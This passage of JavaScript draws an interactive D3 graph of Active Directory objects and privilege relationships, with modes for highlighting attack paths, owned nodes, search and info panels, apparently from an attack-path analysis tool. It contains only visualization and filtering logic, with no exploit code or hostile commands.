  const gridPat = defs.append('pattern').attr('id','gGrid').attr('width',44).attr('height',44).attr('patternUnits','userSpaceOnUse');
  gridPat.append('path').attr('d','M44,0 L0,0 0,44').attr('fill','none').attr('stroke','rgba(0,212,255,.04)').attr('stroke-width',1);
  svg.insert('rect','g').attr('width','100%').attr('height','100%').attr('fill','url(#gGrid)');

  // Keep the current graph focus when clicking empty canvas space.
  svg.on('click', () => { G.lastAct = Date.now(); hideEdgeTip(); });

  G.mode = G.mode || 'smart';
  G.initialized = true;

  // pulse interval
  if (G.pulseInterval) clearInterval(G.pulseInterval);
  let pr=0, pd=1;
  G.pulseInterval = setInterval(()=>{
    pr+=pd*.3; if(pr>7)pd=-1; if(pr<-1)pd=1;
    if (G.root) {
      G.root.selectAll('.g-ring')
        .attr('r', function(){ return +this.dataset.base + 5 + pr; })
        .attr('opacity', .12+Math.abs(pr)/28);
    }
  }, 28);

  // auto-cycle attack paths
  if (G.cycleTimer) clearInterval(G.cycleTimer);
  G.cycleTimer = setInterval(() => {
    if (G.selNode || gVisualFocusSet().size || Date.now()-G.lastAct < 8000 || !S.paths.length) return;
    G.cycleIdx = (G.cycleIdx+1) % Math.min(S.paths.length, 5);
    const path = S.paths[G.cycleIdx];
    if (!path?.chain) return;
    const pnSet = new Set(path.chain.map(s=>s.name.toUpperCase().split('@')[0]));
    const plSet = new Set();
    const pairSet = new Set();
    const exactPairSet = new Set();
    for (let i=0;i<path.chain.length-1;i++) {
      const s = path.chain[i].name.toUpperCase().split('@')[0];
      const t = path.chain[i+1].name.toUpperCase().split('@')[0];
      const right = path.chain[i+1].right;
      if (right) {
        plSet.add(`${s}|${t}|${right}`);
        exactPairSet.add(`${s}|${t}`);
      }
      pairSet.add(`${s}|${t}`);
    }
    G.root.selectAll('.g-mc').attr('opacity', function(){
      return pnSet.has(this.dataset.id)?1:.1;
    });
    G.root.selectAll('.g-nl').attr('opacity', function(){
      return pnSet.has(this.dataset.id)?1:.06;
    });
    G.root.selectAll('.g-link').attr('stroke-opacity', function(){
      const hit = plSet.has(this.dataset.key) || (!exactPairSet.has(this.dataset.pair) && pairSet.has(this.dataset.pair));
      return hit ? .9 : .04;
    }).attr('stroke-width', function(){
      const hit = plSet.has(this.dataset.key) || (!exactPairSet.has(this.dataset.pair) && pairSet.has(this.dataset.pair));
      return hit ? 2.6 : 1.2;
    });
    G.root.selectAll('.g-lbl').attr('opacity', function(){
      const hit = plSet.has(this.dataset.key) || (!exactPairSet.has(this.dataset.pair) && pairSet.has(this.dataset.pair));
      return hit ? .9 : .03;
    });
    showGPathBar(path);
    document.getElementById('gInfo').classList.add('hidden');
  }, 5000);
}

function compactStructureView(nodes, links) {
  const nodeById = Object.fromEntries(nodes.map(n => [n.id, n]));
  const containsBySource = new Map();
  links.forEach(l => {
    const source = l.source?.id || l.source;
    const target = l.target?.id || l.target;
    const targetNode = nodeById[target];
    if (l.right !== 'Contains' || !targetNode) return;
    if (!['User', 'Group'].includes(targetNode.type)) return;
    if (!containsBySource.has(source)) containsBySource.set(source, []);
    containsBySource.get(source).push({...l, source, target});
  });

  const importantName = /(^|\b)(ADMIN|ADMINS|KRBTGT|PROTECTED USERS|KEY ADMINS|DNSADMINS|GROUP POLICY CREATOR|SVC_|RECOVERY)(\b|$)/i;
  const keepExact = (node) => node?.owned || node?.onPath || node?.type === 'dc' || importantName.test(node?.label || node?.id || '');
  const collapseTargets = new Map();
  const bucketByItem = {};
  const bucketNodes = [];
  const bucketLinks = [];

  containsBySource.forEach((children, source) => {
    if (children.length < 10) return;
    const groups = new Map();
    children.forEach(l => {
      const node = nodeById[l.target];
      if (keepExact(node)) return;
      const type = node.type || 'Object';
      if (!groups.has(type)) groups.set(type, []);
      groups.get(type).push(l);
    });
    groups.forEach((items, type) => {
      if (items.length < 4) return;
      const id = `__STRUCT_BUCKET__${source}__${type}`;
      items.forEach(l => collapseTargets.set(`${l.source}|${l.target}|Contains`, id));
      items.forEach(l => bucketByItem[l.target] = id);
      bucketNodes.push({
        id,
        label: `${items.length} ${type}${items.length===1?'':'s'}`,
        type: 'Bucket',
        bucket: true,
        bucketSource: source,
        bucketType: type,
        bucketCount: items.length,
        bucketItems: items.map(l => l.target),
        owned: false,
      });
      bucketLinks.push({
        source,
        target: id,
        right: 'Contains',
        sev: 4,
        structural: true,
        compacted: true,
        id: `${source}|${id}|Contains`,
      });
    });
  });

  if (!bucketNodes.length) return { nodes, links, bucketByItem };
  const compactedLinks = links.filter(l => {
    const source = l.source?.id || l.source;
    const target = l.target?.id || l.target;
    return !collapseTargets.has(`${source}|${target}|${l.right}`);
  }).concat(bucketLinks);

  const visibleIds = new Set();
  compactedLinks.forEach(l => {
    visibleIds.add(l.source?.id || l.source);
    visibleIds.add(l.target?.id || l.target);
  });
  const compactedNodes = nodes.filter(n => visibleIds.has(n.id)).concat(bucketNodes);
  return { nodes: compactedNodes, links: compactedLinks, bucketByItem };
}

function drawGraph(nodes, links, container) {
  if (!G.svg) return;
  hideEdgeTip();
  const root = G.root;
  const W = container.clientWidth  || window.innerWidth  - 290;
  const H = container.clientHeight || window.innerHeight - 48;

  G.allNodes = nodes.map(n => ({...n}));
  G.allNById = Object.fromEntries(G.allNodes.map(n => [n.id, n]));
  G.allLinks = links.map(l => {
    const source = l.source?.id || l.source;
    const target = l.target?.id || l.target;
    return {...l, source, target, _key: `${source}|${target}|${l.right}`, _pairKey: `${source}|${target}`};
  });
  G.bucketByItem = {};

  // Filter by mode
  let visNodes = nodes, visLinks = links;
  if (G.mode === 'smart') {
    const smart = gSmartGraph(nodes, links);
    visNodes = smart.nodes;
    visLinks = smart.links;
  } else if (G.mode === 'paths') {
    const { pathKeys, pairKeys, exactPairs, pathNodeSet } = buildAttackPathLinks();
    visLinks = links.filter(l => {
      const s = l.source?.id || l.source;
      const t = l.target?.id || l.target;
      const pair = `${s}|${t}`;
      return pathKeys.has(`${pair}|${l.right}`) || (!exactPairs.has(pair) && pairKeys.has(pair));
    });
    visLinks.forEach(l => {
      pathNodeSet.add(l.source?.id || l.source);
      pathNodeSet.add(l.target?.id || l.target);
    });
    visNodes = nodes.filter(n => pathNodeSet.has(n.id));
  } else if (G.mode === 'owned') {
    const ownedSet = new Set([...S.owned]);
    const connSet = new Set([...S.owned]);
    links.forEach(l => {
      const s=l.source?.id||l.source, t=l.target?.id||l.target;
      if (ownedSet.has(s)||ownedSet.has(t)) { connSet.add(s); connSet.add(t); }
    });
    visNodes = nodes.filter(n => connSet.has(n.id));
    const visSet = new Set(visNodes.map(n=>n.id));
    visLinks = links.filter(l => visSet.has(l.source?.id||l.source) && visSet.has(l.target?.id||l.target));
  } else if (G.mode === 'focus') {
    const focusSet = new Set(gVisualFocusSet());
    if (!focusSet.size && G.selNode) focusSet.add(G.selNode);
    const connSet = new Set(focusSet);
    visLinks = links.filter(l => {
      const s=l.source?.id||l.source, t=l.target?.id||l.target;
      const keep = focusSet.has(s) || focusSet.has(t);
      if (keep) {
        connSet.add(s);
        connSet.add(t);
      }
      return keep;
    });
    visNodes = nodes.filter(n => connSet.has(n.id));
  }

  if (G.edgeLayer === 'acl') {
    visLinks = visLinks.filter(l => !l.structural);
  } else if (G.edgeLayer === 'structure') {
    visLinks = visLinks.filter(l => l.structural);
    const compacted = compactStructureView(visNodes, visLinks);
    visNodes = compacted.nodes;
    visLinks = compacted.links;
    G.bucketByItem = compacted.bucketByItem || {};
  }
  if (G.edgeLayer !== 'all') {
    const edgeNodeSet = new Set();
    visLinks.forEach(l => {
      edgeNodeSet.add(l.source?.id || l.source);
      edgeNodeSet.add(l.target?.id || l.target);
    });
    visNodes = visNodes.filter(n => edgeNodeSet.has(n.id));
  }
  if (gEdgeFiltersChanged()) {
    const pathInfo = buildAttackPathLinks();
    visLinks = visLinks.filter(l => gPassesEdgeFilters(l, pathInfo));
    const filterNodeSet = new Set();
    visLinks.forEach(l => {
      filterNodeSet.add(l.source?.id || l.source);
      filterNodeSet.add(l.target?.id || l.target);
    });
    gVisualFocusSet().forEach(id => filterNodeSet.add(id));
    if (G.selNode) filterNodeSet.add(G.selNode);
    visNodes = visNodes.filter(n => filterNodeSet.has(n.id));
  }

  // Deduplicate exact links only. Keep distinct rights between the same nodes.
  const linkMap = new Map();
  visLinks.forEach(l => {
    const s = l.source?.id || l.source;
    const t = l.target?.id || l.target;
    const key = `${s}|${t}|${l.right}`;
    if (!linkMap.has(key) || linkMap.get(key).sev > l.sev) {
      linkMap.set(key, {...l, _key: key, _pairKey: `${s}|${t}`});
    }
  });
  const dedupLinks = [...linkMap.values()];
  const pairCounts = new Map();
  dedupLinks.forEach(l => pairCounts.set(l._pairKey, (pairCounts.get(l._pairKey) || 0) + 1));
  const pairSeen = new Map();
  dedupLinks.forEach(l => {
    const idx = pairSeen.get(l._pairKey) || 0;
    const count = pairCounts.get(l._pairKey) || 1;
    pairSeen.set(l._pairKey, idx + 1);
    l._parallelIndex = idx;
    l._parallelCount = count;
    l._curveOffset = (idx - (count - 1) / 2) * 28;
  });

  // Stop old sim
  if (G.sim) G.sim.stop();

  // Work on copies so D3 can mutate source/target
  const simNodes = visNodes.map(n => ({...n}));
  const nById = Object.fromEntries(simNodes.map(n=>[n.id,n]));
  const simLinks = dedupLinks.map(l => ({
    ...l,
    source: l.source?.id||l.source,
    target: l.target?.id||l.target,
    _key: `${l.source?.id||l.source}|${l.target?.id||l.target}|${l.right}`,
    _pairKey: `${l.source?.id||l.source}|${l.target?.id||l.target}`,
  }));

  // Clear previous drawing
  root.selectAll('*').remove();

  // Background grid
  G.svg.select('rect[fill="url(#gGrid)"]').remove();
  G.svg.insert('rect','g').attr('width','100%').attr('height','100%').attr('fill','url(#gGrid)');

  // ── Link layer
  const linkLayer = root.append('g');
  const linkPaths = linkLayer.selectAll('path')
    .data(simLinks).enter().append('path')
    .attr('class','g-link')
    .attr('data-key', d => d._key)
    .attr('data-pair', d => d._pairKey)
    .attr('fill','none')
    .attr('stroke', d => G_SEV_COLOR[d.sev])
    .attr('stroke-width', 1.2)
    .attr('stroke-opacity', .05)
    .attr('stroke-dasharray', d => d.structural ? '4 5' : null);

  // Dedicated arrowheads are the click target for edge tooltips.
  const arrowLayer = root.append('g');
  const linkArrows = arrowLayer.selectAll('polygon.g-arrow')
    .data(simLinks).enter().append('polygon')
    .attr('class','g-arrow')
    .attr('data-key', d => d._key)
    .attr('data-pair', d => d._pairKey)
    .attr('points','0,-6 12,0 0,6')
    .attr('fill', d => G_SEV_COLOR[d.sev])
    .attr('fill-opacity', .82)
    .attr('stroke', '#030810')
    .attr('stroke-width', 1)
    .attr('stroke-linejoin','round')
    .style('cursor','pointer')
    .on('click', (e, d) => {
      e.stopPropagation();
      G.lastAct = Date.now();
      restorePinnedEdgeVisual();
      if (G.edgeTipKey === d._key && edgeTipVisible) {
        hideEdgeTip();
        return;
      }
      linkPaths.filter(l => l._key === d._key)
        .attr('stroke-width', 3).attr('stroke-opacity', 1);
      linkArrows.filter(l => l._key === d._key).attr('fill-opacity', 1);
      showEdgeTip(e, d);
    });

  const lblLayer = root.append('g');
  const linkLabels = lblLayer.selectAll('text')
    .data(simLinks.filter(l => !G_SKIP_LABEL.has(l.right))).enter()
    .append('text').attr('class','g-lbl')
    .attr('data-key', d => d._key)
    .attr('data-pair', d => d._pairKey)
    .attr('text-anchor','middle').attr('dominant-baseline','central')
    .attr('font-family','Share Tech Mono,monospace').attr('font-size',11)
    .attr('fill', d => G_SEV_COLOR[d.sev]).attr('opacity',.04)
    .attr('pointer-events','none').text(d => d.right);

  // ── Node layer
  const nodeLayer = root.append('g');
  const nodeGs = nodeLayer.selectAll('g')
    .data(simNodes).enter().append('g')
    .attr('data-id', d => d.id)
    .style('cursor','pointer')
    .call(d3.drag()
      .on('start',(e,d)=>{G.lastAct=Date.now();if(!e.active)G.sim.alphaTarget(.3).restart();d.fx=d.x;d.fy=d.y;})
      .on('drag', (e,d)=>{d.fx=e.x;d.fy=e.y;})
      .on('end',  (e,d)=>{if(!e.active)G.sim.alphaTarget(0);d.fx=null;d.fy=null;})
    )
    .on('click',      (e,d)=>{e.stopPropagation();G.lastAct=Date.now();hideEdgeTip();gOnNodeClick(d,simLinks,simNodes);})
    .on('mouseenter', (e,d)=>gOnHover(e,d))
    .on('mouseleave', ()=>gOnHoverEnd());

  // Pulse ring
  nodeGs.filter(d=>d.owned||d.type==='dc')
    .append('circle').attr('class','g-ring')
    .attr('data-base', d=>G_NODE_RADIUS[d.type]||14)
    .attr('r', d=>(G_NODE_RADIUS[d.type]||14)+6)
    .attr('fill','none')
    .attr('stroke', d=>d.owned?'#00ff88':'#ff2244')
    .attr('stroke-width',1.2).attr('opacity',.3)
    .attr('pointer-events','none');

  // Main circle
  nodeGs.append('circle').attr('class','g-mc')
    .attr('data-id', d=>d.id)
    .attr('r', d=>G_NODE_RADIUS[d.type]||14)
    .attr('fill',   d=>d.owned?'#00ff88':G_NODE_COLOR[d.type]||'#00d4ff')
    .attr('stroke', d=>d.owned?'#00cc66':G_NODE_STROKE[d.type]||'#007799')
    .attr('stroke-width',1.5)
    .attr('filter', d=>(d.type==='dc'||d.owned)?'url(#gGlow)':null);

  // Icon
  nodeGs.append('text')
    .attr('text-anchor','middle').attr('dominant-baseline','central')
    .attr('font-size', d=>(G_NODE_RADIUS[d.type]||14)*.9+'px')
    .attr('pointer-events','none')
    .text(d=>G_NODE_ICON[d.type]||'👤');

  // Label
  nodeGs.append('text').attr('class','g-nl')
    .attr('data-id', d=>d.id)
    .attr('text-anchor','middle').attr('dominant-baseline','hanging')
    .attr('font-family','Share Tech Mono,monospace').attr('font-size',11)
    .attr('pointer-events','none')
    .attr('fill', d=>d.owned?'#00ff88':d.type==='dc'?'#ff6677':'#4a7090')
    .text(d=>d.label);

  // ── Simulation
  G.sim = d3.forceSimulation(simNodes)
    .force('link', d3.forceLink(simLinks).id(d=>d.id)
      .distance(d=>{
        const st=d.source.type,tt=d.target.type;
        if(tt==='Domain'||st==='Domain') return 210;
        if(tt==='dc'||st==='dc')         return 175;
        if(tt==='Group'||st==='Group')   return 130;
        return 105;
      }).strength(.45))
    .force('charge', d3.forceManyBody().strength(d=>({dc:-700,Domain:-600,Group:-380})[d.type]??-270))
    .force('center', d3.forceCenter(W/2,H/2).strength(.08))
    .force('collide', d3.forceCollide().radius(d=>(G_NODE_RADIUS[d.type]||14)+28).strength(.72))
    .on('tick', () => {
      const pathD = d=>{
        const sx=d.source.x,sy=d.source.y,tx=d.target.x,ty=d.target.y;
        const dx=tx-sx,dy=ty-sy,len=Math.hypot(dx,dy)||1;
        const curve = d._curveOffset ?? 0;
        const mx=(sx+tx)/2-dy/len*(16 + curve), my=(sy+ty)/2+dx/len*(16 + curve);
        return `M${sx},${sy} Q${mx},${my} ${tx},${ty}`;
      };
      linkPaths.attr('d', pathD);
      linkArrows.attr('transform', d => {
        const sx=d.source.x,sy=d.source.y,tx=d.target.x,ty=d.target.y;
        const dx=tx-sx,dy=ty-sy,len=Math.hypot(dx,dy)||1;
        const curve = d._curveOffset ?? 0;
        const mx=(sx+tx)/2-dy/len*(16 + curve), my=(sy+ty)/2+dx/len*(16 + curve);
        const endPad=(G_NODE_RADIUS[d.target.type]||14)+7;
        const t=Math.max(.55, Math.min(.9, 1 - endPad/len));
        const u=1-t;
        const x=u*u*sx+2*u*t*mx+t*t*tx;
        const y=u*u*sy+2*u*t*my+t*t*ty;
        const ddx=2*u*(mx-sx)+2*t*(tx-mx);
        const ddy=2*u*(my-sy)+2*t*(ty-my);
        const angle=Math.atan2(ddy, ddx)*180/Math.PI;
        return `translate(${x},${y}) rotate(${angle}) translate(-6,0)`;
      });
      linkLabels
        .attr('x',d=>{
          const sx=d.source.x,sy=d.source.y,tx=d.target.x,ty=d.target.y;
          const dx=tx-sx,dy=ty-sy,len=Math.hypot(dx,dy)||1;
          return (sx+tx)/2-dy/len*((d._curveOffset ?? 0)+8);
        })
        .attr('y',d=>{
          const sx=d.source.x,sy=d.source.y,tx=d.target.x,ty=d.target.y;
          const dx=tx-sx,dy=ty-sy,len=Math.hypot(dx,dy)||1;
          return (sy+ty)/2+dx/len*((d._curveOffset ?? 0)+8)-10;
        });
      nodeGs.attr('transform',d=>`translate(${d.x},${d.y})`);
    });

  // Store for interactions
  G.simNodes  = simNodes;
  G.simLinks  = simLinks;
  G.nById     = nById;
  G.linkPaths  = linkPaths;
  G.linkArrows = linkArrows;
  G.linkLabels = linkLabels;
  G.nodeGs     = nodeGs;
  G.hoverFocusNode = null;
  gPruneVisualFocusToVisible();
  if ((S.objectSearch || '').trim()) applyGraphSearch();
  else {
    gApplyVisualFocus(G.simLinks || []);
    const selected = G.simNodes?.find(n => n.id === G.selNode) || G.allNById?.[G.selNode];
    if (selected) showGInfo(selected, G.simLinks || []);
  }
}

// ── Graph interaction ─────────────────────────────────────────────────────
function gLinkTouches(l, id) {
  const s = l.source?.id || l.source;
  const t = l.target?.id || l.target;
  return s === id || t === id;
}

function gVisualFocusSet() {
  if (!(G.visualFocusNodes instanceof Set)) G.visualFocusNodes = new Set();
  return G.visualFocusNodes;
}

function gLinkTouchesActive(l) {
  const focus = gVisualFocusSet();
  for (const id of focus) {
    if (gLinkTouches(l, id)) return true;
  }
  if (G.searchFocusNode && gLinkTouches(l, G.searchFocusNode)) return true;
  if (G.hoverFocusNode && gLinkTouches(l, G.hoverFocusNode)) return true;
  return false;
}

function gPaintPassiveGraph() {
  if (G.root) {
    G.root.selectAll('.g-mc').attr('opacity', 1);
    G.root.selectAll('.g-nl').attr('opacity', 1);
    G.root.selectAll('.g-ring').attr('opacity', .3);
  }
  if (G.linkPaths) G.linkPaths.attr('stroke-opacity', .05).attr('stroke-width', 1.2);
  if (G.linkArrows) G.linkArrows.attr('fill-opacity', .18);
  if (G.linkLabels) G.linkLabels.attr('opacity', .04);
}

function gSetPassiveEdges() {
  G.visualFocusNodes = new Set();
  G.visualFocusNode = null;
  G.searchFocusNode = null;
  G.hoverFocusNode = null;
  gPaintPassiveGraph();
}

function gApplyVisualFocus(simLinks) {
  if (!G.root) return;
  const focus = gVisualFocusSet();
  const activeIds = new Set(focus);
  if (G.searchFocusNode) activeIds.add(G.searchFocusNode);
  if (G.hoverFocusNode) activeIds.add(G.hoverFocusNode);
  if (!activeIds.size) {
    gPaintPassiveGraph();
    return;
  }

  const conn = new Set(activeIds);
  simLinks.forEach(l => {
    const s = l.source?.id || l.source;
    const t = l.target?.id || l.target;
    if (activeIds.has(s) || activeIds.has(t)) {
      conn.add(s);
      conn.add(t);
    }
  });

  G.root.selectAll('.g-mc').attr('opacity', function(){ return conn.has(this.dataset.id)?1:.1; });
  G.root.selectAll('.g-nl').attr('opacity', function(){ return conn.has(this.dataset.id)?1:.06; });
  G.root.selectAll('.g-ring').attr('opacity', .3);
  if (G.linkPaths) {
    G.linkPaths
      .attr('stroke-opacity', l=>gLinkTouchesActive(l) ? .93 : .05)
      .attr('stroke-width',   l=>gLinkTouchesActive(l) ? 2.6 : 1.2);
  }
  if (G.linkArrows) {
    G.linkArrows.attr('fill-opacity', l=>gLinkTouchesActive(l) ? .92 : .18);
  }
  if (G.linkLabels) {
    G.linkLabels.attr('opacity', l=>gLinkTouchesActive(l) ? .9 : .04);
  }
}

function gAddVisualFocus(id, simLinks) {
  gVisualFocusSet().add(id);
  G.visualFocusNode = id;
  gApplyVisualFocus(simLinks);
}

function gRemoveVisualFocus(id, simLinks) {
  gVisualFocusSet().delete(id);
  G.visualFocusNode = gVisualFocusSet().size ? [...gVisualFocusSet()][gVisualFocusSet().size - 1] : null;
  gApplyVisualFocus(simLinks);
}

function gSetSearchPreviewFocus(id, simLinks) {
  G.searchFocusNode = id || null;
  gApplyVisualFocus(simLinks);
}

function gSetHoverPreviewFocus(id, simLinks) {
  G.hoverFocusNode = id || null;
  gApplyVisualFocus(simLinks);
}

function gResetGraphVisualState() {
  hideEdgeTip();
  clearGraphContextFocus();
  clearGraphSearchFocus();
  G.selNode = null;
  gSetPassiveEdges();
  document.getElementById('gInfo')?.classList.add('hidden');
  const pathBar = document.getElementById('gPathBar');
  if (pathBar) pathBar.style.display = 'none';
}

function gPruneVisualFocusToVisible() {
  const visibleIds = new Set((G.simNodes || []).map(n => n.id));
  const focus = gVisualFocusSet();
  for (const id of [...focus]) {
    if (!visibleIds.has(id)) focus.delete(id);
  }
  if (G.searchFocusNode && !visibleIds.has(G.searchFocusNode)) G.searchFocusNode = null;
  if (G.hoverFocusNode && !visibleIds.has(G.hoverFocusNode)) G.hoverFocusNode = null;
  if (G.selNode && !visibleIds.has(G.selNode) && !G.allNById?.[G.selNode]) G.selNode = null;
}

function visibleContextForHiddenNode(id) {
  const visibleIds = new Set((G.simNodes || []).map(n => n.id));
  const parent = (G.allLinks || []).find(l => l.right === 'Contains' && l.target === id)?.source;
  if (parent && visibleIds.has(parent)) return parent;
  const bucket = G.bucketByItem?.[id];
  if (bucket && visibleIds.has(bucket)) return bucket;
  return null;
}

function clearGraphContextFocus() {
  if (G.nodeGs) G.nodeGs.selectAll('.g-context-ring').remove();
}

function markGraphContextFocus(id) {
  if (!G.nodeGs) return;
  clearGraphContextFocus();
  const target = G.nodeGs.filter(d => d.id === id);
  target.append('circle')
    .attr('class','g-context-ring')
    .attr('r', d => (G_NODE_RADIUS[d.type] || 14) + 13)
    .attr('fill','none')
    .attr('stroke','#7dd3fc')
    .attr('stroke-width',2.4)
    .attr('stroke-dasharray','6 3')
    .attr('pointer-events','none');
}

function gOnNodeClick(d, simLinks, simNodes) {
  clearGraphContextFocus();
  clearGraphSearchFocus();
  G.searchFocusNode = null;
  G.hoverPanelPrev = null;
  if (gVisualFocusSet().has(d.id)) {
    gRemoveVisualFocus(d.id, simLinks);
    if (G.selNode === d.id) {
      G.selNode = null;
      document.getElementById('gInfo').classList.add('hidden');
      document.getElementById('gPathBar').style.display='none';
    }
    return;
  }
  G.selNode = d.id;
  gAddVisualFocus(d.id, simLinks);

  showGInfo(d, simLinks);

  // Show attack path if this node is on one
  const ap = S.paths.find(p=>p.chain?.some(s=>s.name.toUpperCase().split('@')[0]===d.id));
  if (ap) showGPathBar(ap);
  else document.getElementById('gPathBar').style.display='none';
}

function gFocusNode(id, event) {
  if (event) {
    event.preventDefault();
    event.stopPropagation();
  }
  G.hoverPanelPrev = null;
  G.hoverFocusNode = null;
  const visible = G.simNodes?.find(n => n.id === id);
  if (visible) {
    gOnNodeClick(visible, G.simLinks || [], G.simNodes || []);
    return;
  }
  const full = G.allNById?.[id];
  if (full) {
    G.selNode = id;
    const contextId = visibleContextForHiddenNode(id);
    if (contextId) {
      gAddVisualFocus(contextId, G.simLinks || []);
      markGraphContextFocus(contextId);
    } else if (G.root) {
      clearGraphContextFocus();
      G.root.selectAll('.g-mc').attr('opacity', .12);
      G.root.selectAll('.g-nl').attr('opacity', .08);
      if (G.linkPaths) G.linkPaths.attr('stroke-opacity', .04).attr('stroke-width', 1.2);
      if (G.linkLabels) G.linkLabels.attr('opacity', .03);
    }
    showGInfo(full, G.simLinks || []);
  }
}

function graphSearchNodeFromItem(item) {
  const obj = G.allNById?.[item.key] || {};
  return {
    ...obj,
    id: item.key,
    label: (item.name || item.key).split('@')[0],
    type: obj.type || item.type || 'Unknown',
    enabled: item.enabled,
    isSearchOnly: true,
  };
}

function markGraphSearchFocus(id) {
  if (!G.nodeGs) return;
  G.nodeGs.selectAll('.g-search-ring').remove();
  const target = G.nodeGs.filter(d => d.id === id);
  target.append('circle')
    .attr('class','g-search-ring')
    .attr('r', d => (G_NODE_RADIUS[d.type] || 14) + 11)
    .attr('fill','none')
    .attr('stroke','#ffd700')
    .attr('stroke-width',2.2)
    .attr('stroke-dasharray','4 3')
    .attr('pointer-events','none');
}

function clearGraphSearchFocus() {
  if (G.nodeGs) G.nodeGs.selectAll('.g-search-ring').remove();
}

function clearGraphSearchPreview() {
  clearGraphSearchFocus();
  G.searchFocusNode = null;
  gApplyVisualFocus(G.simLinks || []);
}

function showSearchOnlyInfo(item, reason) {
  const panel = document.getElementById('gInfo');
  if (!panel) return;
  document.getElementById('gIIcon').textContent = G_NODE_ICON[item.type] || '•';
  document.getElementById('gIName').textContent = (item.name || item.key).split('@')[0];
  document.getElementById('gIType').textContent = `${item.type || 'Object'} // SEARCH MATCH`;
  document.getElementById('gIBody').innerHTML =
    `<div class="g-info-row"><span style="color:var(--dim2)">Graph status</span><span class="ip-val">${escHtml(reason)}</span></div>`;
  document.getElementById('gIEdges').innerHTML =
    '<div class="g-edge-empty">No visible node exists for this object in the current graph view</div>';
  panel.classList.remove('hidden');
}

function applyGraphSearch() {
  if (S.currentTab !== 'graph' || !G.root) return;
  clearGraphSearchFocus();
  G.searchFocusNode = null;
  const q = (S.objectSearch || '').trim();
  if (!q) {
    gApplyVisualFocus(G.simLinks || []);
    return;
  }
  const statusMap = overviewGraphStatusMap();
  const matches = objectSearchMatches(statusMap);
  if (!matches.length) {
    showSearchOnlyInfo({name:q, key:q.toUpperCase(), type:'Object'}, 'No match');
    return;
  }
  const item = matches[0];
  const visible = G.simNodes?.find(n => n.id === item.key);
  if (visible) {
    G.selNode = item.key;
    gSetSearchPreviewFocus(item.key, G.simLinks || []);
    showGInfo(visible, G.simLinks || []);
    markGraphSearchFocus(item.key);
    return;
  }
  if (item.status?.bucketed && G.edgeLayer !== 'structure') {
    G.edgeLayer = 'structure';
    gSyncToolbarState();
    const { nodes, links } = buildGraphData();
    const container = document.getElementById('graphView');
    drawGraph(nodes, links, container);
    return;
  }
  const bucketId = G.bucketByItem?.[item.key];
  const bucket = bucketId ? G.simNodes?.find(n => n.id === bucketId) : null;
  if (bucket) {
    gSetSearchPreviewFocus(bucketId, G.simLinks || []);
    markGraphSearchFocus(bucketId);
    showGInfo(graphSearchNodeFromItem(item), G.simLinks || []);
    return;
  }
  showSearchOnlyInfo(item, item.status?.visible ? 'Hidden by current filters' : 'Disconnected');
}

function gToggleInfoSection(key, event) {
  if (event) {
    event.preventDefault();
    event.stopPropagation();
  }
  G.infoExpanded[key] = !G.infoExpanded[key];
  const node = G.simNodes?.find(n => n.id === G.selNode) || G.allNById?.[G.selNode];
  if (node) showGInfo(node, G.simLinks || []);
}

function gOnHover(e,d) {
  gSetHoverPreviewFocus(d.id, G.simLinks || []);
  const panel = document.getElementById('gInfo');
  if (!G.hoverPanelPrev && panel) {
    G.hoverPanelPrev = {
      selNode: G.selNode,
      hidden: panel.classList.contains('hidden'),
    };
  }
  showGInfo(d, G.simLinks || [], {preview:true});
  const t = document.getElementById('tip');
  if (!t) return;
  t.textContent = `${d.label} — ${d.type}${d.owned?' [OWNED]':''}`;
  t.style.left=(e.clientX+14)+'px'; t.style.top=(e.clientY-10)+'px';
  t.classList.add('show');
}

function gOnHoverEnd() {
  G.hoverFocusNode = null;
  gApplyVisualFocus(G.simLinks || []);
  const prev = G.hoverPanelPrev;
  G.hoverPanelPrev = null;
  if (prev) {
    G.selNode = prev.selNode;
    if (prev.hidden || !prev.selNode) {
      document.getElementById('gInfo')?.classList.add('hidden');
    } else {
      const selected = G.simNodes?.find(n => n.id === prev.selNode) || G.allNById?.[prev.selNode];
      if (selected) showGInfo(selected, G.simLinks || []);
      else document.getElementById('gInfo')?.classList.add('hidden');
    }
  }
  document.getElementById('tip')?.classList.remove('show');
}

function gClearSel() {
  G.selNode = null;
  if (!G.root) return;
  hideEdgeTip();
  clearGraphContextFocus();
  G.root.selectAll('.g-mc').attr('opacity',1);
  G.root.selectAll('.g-nl').attr('opacity',1);
  G.root.selectAll('.g-ring').attr('opacity',.3);
  gSetPassiveEdges();
  document.getElementById('gInfo').classList.add('hidden');
  document.getElementById('gPathBar').style.display='none';
}

function showGInfo(d, simLinks, opts={}) {
  if (!opts.preview) G.selNode = d.id;
  const isOwned = S.owned.has(d.id) || d.owned;
  d = {...d, owned:isOwned};
  document.getElementById('gIIcon').textContent = G_NODE_ICON[d.type]||'👤';
  document.getElementById('gIName').textContent = d.label;
  document.getElementById('gIType').textContent = d.type+(d.owned?' // OWNED ✓':'');

  const rows=[];
  if(d.enabled!==undefined) rows.push(['Enabled',d.enabled?'Yes':'No',d.enabled?'green':'red']);
  if(d.admincount) rows.push(['AdminCount','True','orange']);
  if(d.t2a4d)      rows.push(['TrustedToAuth','⚡ T2A4D','yellow']);
  if(d.unconstrained) rows.push(['Delegation','UNCONSTRAINED ⚡','red']);
  if(d.owned)      rows.push(['Status','OWNED ✓','green']);
  const canStart = ['User','Computer','gmsa','dc'].includes(d.type);
  const startAction = canStart
    ? `<button class="g-owned-action ${d.owned?'remove':''}" data-node="${escAttr(d.id)}" onclick="toggleGraphStartingPoint(this.dataset.node, event)">${d.owned?'Remove starting point':'Mark as starting point'}</button>`
    : `<div class="g-owned-note">Only users, computers and gMSA accounts can be marked as starting points.</div>`;

  const fullLinks = G.allLinks || simLinks.map(l => ({
    ...l,
    source: l.source?.id || l.source,
    target: l.target?.id || l.target,
  }));
  const fullNodes = G.allNById || G.nById || {};
  const outL=fullLinks.filter(l=>l.source===d.id);
  const inL =fullLinks.filter(l=>l.target===d.id);
  const nodeName = id => escHtml(fullNodes[id]?.label || G.nById?.[id]?.label || id);
  const nodeType = id => escHtml(fullNodes[id]?.type || G.nById?.[id]?.type || '');
  const edgeRow = (l, oid, meta='') => {
    const c=G_SEV_COLOR[l.sev];
    return `<div class="g-edge-row clickable" data-goto="${escAttr(oid)}" onclick="gFocusNode(this.dataset.goto, event)">
      <span class="g-badge" style="background:${c}18;color:${c};border:1px solid ${c}33">${escHtml(l.right)}</span>
      <span class="g-edge-name" title="${nodeName(oid)}">${nodeName(oid)}</span>
      <span class="g-edge-meta">${escHtml(meta || nodeType(oid))}</span>
    </div>`;
  };
